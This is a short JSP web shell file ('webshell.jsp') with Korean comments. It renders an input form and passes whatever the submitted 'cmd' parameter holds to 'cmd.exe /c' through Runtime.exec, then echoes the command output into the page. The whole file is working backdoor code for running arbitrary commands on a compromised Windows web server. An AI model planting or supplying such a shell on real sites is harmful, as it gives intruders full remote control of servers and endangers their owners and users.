<%@ page contentType="text/html;charset=UTF-8" %> <!--jsp가 생성할 문서의 타입을 지정-->
<%@ page import="java.io.*" %>

<FORM METHOD=GET ACTION='webshell.jsp'>
  <INPUT name='cmd' type=text>
  <INPUT type=submit value='Run'>
</FORM>

<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String tmp = null;
      try {
         Process p = Runtime.getRuntime().exec("cmd.exe /c "+cmd); //명령어 실행
         BufferedReader bf = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((tmp = bf.readLine()) != null) //라인이 없을 때까지 output에 저장
         {
           output = output+tmp+"<br>";
         }
      } catch(IOException e)
      {
        e.printStackTrace();
      }
    }
    else
    {
      out.println("출력 없음");
    }
   out.println(output);
%>
